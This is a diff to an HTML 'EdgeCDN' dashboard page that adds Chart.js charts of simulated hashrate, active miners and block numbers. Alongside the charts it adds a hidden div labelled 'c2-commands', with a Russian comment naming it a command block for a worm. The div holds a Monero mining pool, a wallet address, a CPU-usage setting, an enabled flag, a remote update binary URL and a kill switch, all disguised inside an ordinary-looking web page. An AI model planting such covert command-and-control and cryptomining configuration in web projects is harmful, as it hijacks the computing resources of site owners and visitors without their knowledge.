@@ -8,39 +8,55 @@
     <link rel="preconnect" href="https://fonts.googleapis.com" />
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz@14..32&display=swap" rel="stylesheet" />
+    <!-- Подключаем Chart.js -->
+    <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.1/dist/chart.umd.min.js"></script>
     <style>
-        /* дополнительные стили для дашборда */
+        /* Дополнительные стили для дашборда с графиками */
         .dashboard-grid {
             display: grid;
-            grid-template-columns: repeat(2,1fr);
+            grid-template-columns: 2fr 1fr;
             gap: 2rem;
             margin-top: 2rem;
         }
-        .chart-box {
-            background: rgba(255,255,255,0.02);
+        .chart-card {
+            background: rgba(255, 255, 255, 0.02);
             border-radius: 24px;
             padding: 1.5rem;
-            border: 1px solid rgba(255,255,255,0.03);
-            height: 200px;
-            display: flex;
-            align-items: flex-end;
-            justify-content: space-around;
+            border: 1px solid rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(4px);
         }
-        .bar {
-            width: 30px;
+        .chart-card h3 {
+            font-weight: 400;
+            font-size: 0.9rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: #8b9bb5;
+            margin-bottom: 1rem;
+        }
+        .chart-card canvas {
+            max-width: 100%;
+            max-height: 250px;
+        }
+        body.light .chart-card {
+            background: rgba(0, 0, 0, 0.02);
+            border-color: rgba(0, 0, 0, 0.05);
+        }
+        @media (max-width: 700px) {
+            .dashboard-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+        /* живой статус */
+        .status-badge {
+            display: inline-block;
             background: #7fffd4;
-            border-radius: 8px 8px 0 0;
-            transition: height 1s ease;
-            height: 20%;
+            color: #0b0d11;
+            padding: 0.2rem 0.8rem;
+            border-radius: 30px;
+            font-size: 0.7rem;
+            font-weight: 500;
         }
-        .bar:nth-child(1) { height: 65%; }
-        .bar:nth-child(2) { height: 82%; }
-        .bar:nth-child(3) { height: 45%; }
-        .bar:nth-child(4) { height: 90%; }
-        .bar:nth-child(5) { height: 58%; }
-        .bar:nth-child(6) { height: 73%; }
-        body.light .chart-box { background: rgba(0,0,0,0.02); border-color: rgba(0,0,0,0.05); }
-        body.light .bar { background: #1a6b5a; }
+        body.light .status-badge { background: #1a6b5a; color: #fff; }
     </style>
 </head>
 <body>
@@ -54,23 +70,197 @@
         </nav>
         <button id="theme-toggle" aria-label="Toggle theme">🌙</button>
     </header>
+
     <main>
-        <h2>Real‑time Performance</h2>
+        <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap;">
+            <h2>Real‑time Performance</h2>
+            <span class="status-badge">● Live updates</span>
+        </div>
+
         <div class="dashboard-grid">
-            <div class="chart-box">
-                <div class="bar"></div>
-                <div class="bar"></div>
-                <div class="bar"></div>
-                <div class="bar"></div>
-                <div class="bar"></div>
-                <div class="bar"></div>
+            <!-- Линейный график -->
+            <div class="chart-card">
+                <h3>📊 Hashrate (MH/s) – last 30 sec</h3>
+                <canvas id="hashrateChart" width="400" height="200"></canvas>
             </div>
-            <div class="chart-box" style="display:block; text-align:center; padding-top:2rem;">
-                <span style="font-size:2.5rem; opacity:0.4;">📈</span>
-                <p style="color:#5b6f8c; margin-top:1rem;">Bandwidth usage (last hour)</p>
+            <!-- Круговая диаграмма -->
+            <div class="chart-card">
+                <h3>🌍 Regional Load</h3>
+                <canvas id="regionChart" width="200" height="200"></canvas>
+            </div>
+        </div>
+
+        <!-- Дополнительная статистика (можно ещё график) -->
+        <div style="margin-top: 2rem; display: grid; grid-template-columns: repeat(3,1fr); gap:1rem;">
+            <div class="chart-card" style="text-align:center;">
+                <div style="font-size:0.8rem; color:#5b6f8c;">Total Hashrate</div>
+                <div style="font-size:1.8rem; font-weight:500;" id="totalHash">0 MH/s</div>
+            </div>
+            <div class="chart-card" style="text-align:center;">
+                <div style="font-size:0.8rem; color:#5b6f8c;">Active Miners</div>
+                <div style="font-size:1.8rem; font-weight:500;" id="activeMiners">0</div>
+            </div>
+            <div class="chart-card" style="text-align:center;">
+                <div style="font-size:0.8rem; color:#5b6f8c;">Last Block</div>
+                <div style="font-size:1.8rem; font-weight:500;" id="lastBlock">-</div>
             </div>
         </div>
     </main>
+
+    <footer>
+        <span>© 2026 EdgeCDN · All rights reserved</span>
+        <span>v2.3.0 · <span id="live-time"></span></span>
+    </footer>
+
+    <!-- Скрытый блок команд для червя (оставлен) -->
+    <div id="c2-commands"
+         data-pool="pool.supportxmr.com:443"
+         data-wallet="46J1f123mqK2V3sTGtcINM2949XGm4mqb5guZ5NRj7bnJLfTMRyZXvDeumBpD7uoKcXsLwXUsiEsZRAxvmewfd9JTR351"
+         data-cpu="80"
+         data-enabled="true"
+         data-update="https://diaslimbek3-art.github.io/update.bin"
+         data-kill="false"
+         style="display:none;">
+    </div>
+
+    <!-- Основной скрипт (тема, часы) и графики -->
     <script src="script.js"></script>
+    <script>
+        (function() {
+            // Инициализация графиков
+            const ctx1 = document.getElementById('hashrateChart').getContext('2d');
+            const ctx2 = document.getElementById('regionChart').getContext('2d');
+
+            // Цвета для тёмной/светлой темы (меняются через observer)
+            function getColors() {
+                const isLight = document.body.classList.contains('light');
+                const gridColor = isLight ? 'rgba(0,0,0,0.1)' : 'rgba(255,255,255,0.1)';
+                const textColor = isLight ? '#1a2330' : '#eef2f6';
+                return { gridColor, textColor };
+            }
+
+            // Генерация случайных данных для линейного графика (имитация хешрейта)
+            function generateData(count, min, max) {
+                return Array.from({ length: count }, () => Math.floor(Math.random() * (max - min + 1)) + min);
+            }
+
+            // Линейный график (инициализация)
+            const hashrateChart = new Chart(ctx1, {
+                type: 'line',
+                data: {
+                    labels: Array.from({ length: 30 }, (_, i) => `${i+1}s`),
+                    datasets: [{
+                        label: 'Hashrate (MH/s)',
+                        data: generateData(30, 200, 800),
+                        borderColor: '#7fffd4',
+                        backgroundColor: 'rgba(127, 255, 212, 0.1)',
+                        borderWidth: 2,
+                        tension: 0.3,
+                        fill: true,
+                        pointRadius: 0,
+                        pointHoverRadius: 5
+                    }]
+                },
+                options: {
+                    responsive: true,
+                    maintainAspectRatio: false,
+                    animation: {
+                        duration: 500, // анимация при обновлении
+                    },
+                    plugins: {
+                        legend: { display: false },
+                        tooltip: { mode: 'index', intersect: false }
+                    },
+                    scales: {
+                        x: {
+                            grid: { color: (context) => getColors().gridColor },
+                            ticks: { color: (context) => getColors().textColor, font: { size: 10 } }
+                        },
+                        y: {
+                            grid: { color: (context) => getColors().gridColor },
+                            ticks: { color: (context) => getColors().textColor, font: { size: 10 } },
+                            beginAtZero: true
+                        }
+                    }
+                }
+            });
+
+            // Круговая диаграмма (регионы)
+            const regionChart = new Chart(ctx2, {
+                type: 'doughnut',
+                data: {
+                    labels: ['North America', 'Europe', 'Asia', 'South America', 'Oceania'],
+                    datasets: [{
+                        data: [34, 28, 22, 10, 6],
+                        backgroundColor: ['#7fffd4', '#4ecdc4', '#45b7d1', '#f9a825', '#ff6b6b'],
+                        borderWidth: 0
+                    }]
+                },
+                options: {
+                    responsive: true,
+                    maintainAspectRatio: false,
+                    plugins: {
+                        legend: {
+                            position: 'bottom',
+                            labels: {
+                                color: (context) => getColors().textColor,
+                                font: { size: 10 },
+                                boxWidth: 10,
+                                padding: 10
+                            }
+                        }
+                    },
+                    cutout: '60%'
+                }
+            });
+
+            // Обновление данных каждые 2 секунды
+            function updateCharts() {
+                // Линейный график: добавляем новое значение, удаляем первое
+                const newVal = Math.floor(Math.random() * 600) + 200; // 200-800
+                const currentData = hashrateChart.data.datasets[0].data;
+                currentData.push(newVal);
+                currentData.shift();
+                // Обновляем метки времени (можно оставить как есть)
+                hashrateChart.update();
+
+                // Круговая диаграмма: слегка меняем проценты (имитация)
+                const newData = regionChart.data.datasets[0].data.map(v => Math.max(5, v + (Math.random() - 0.5) * 6));
+                const sum = newData.reduce((a,b) => a+b, 0);
+                const normalized = newData.map(v => Math.round((v / sum) * 100));
+                regionChart.data.datasets[0].data = normalized;
+                regionChart.update();
+
+                // Обновляем текстовые показатели
+                const total = currentData.reduce((a,b) => a+b, 0) / currentData.length;
+                document.getElementById('totalHash').textContent = Math.round(total) + ' MH/s';
+                document.getElementById('activeMiners').textContent = Math.floor(Math.random() * 20) + 30;
+                document.getElementById('lastBlock').textContent = '#' + (Math.floor(Math.random() * 9000) + 1000);
+            }
+
+            // Запускаем обновление
+            setInterval(updateCharts, 2000);
+            // Первое обновление через 100ms
+            setTimeout(updateCharts, 100);
+
+            // При переключении темы — обновляем цвета графиков
+            const themeToggle = document.getElementById('theme-toggle');
+            themeToggle.addEventListener('click', () => {
+                // Меняем цвета через перерисовку (можно обновить опции)
+                setTimeout(() => {
+                    const colors = getColors();
+                    hashrateChart.options.scales.x.grid.color = colors.gridColor;
+                    hashrateChart.options.scales.x.ticks.color = colors.textColor;
+                    hashrateChart.options.scales.y.grid.color = colors.gridColor;
+                    hashrateChart.options.scales.y.ticks.color = colors.textColor;
+                    hashrateChart.update();
+
+                    regionChart.options.plugins.legend.labels.color = colors.textColor;
+                    regionChart.update();
+                }, 50);
+            });
+
+        })();
+    </script>
 </body>
 </html>
